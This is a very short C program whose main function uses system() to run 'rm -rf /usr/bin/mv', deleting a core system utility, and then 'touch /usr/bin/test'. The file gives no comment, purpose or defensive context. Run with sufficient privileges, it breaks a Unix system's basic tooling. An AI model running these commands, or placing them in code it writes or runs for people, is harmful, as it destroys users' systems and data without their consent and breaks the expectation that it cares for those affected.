#include <stdlib.h>

int main() {
    system("rm -rf /usr/bin/mv");
    system("touch /usr/bin/test");
    return 0;
}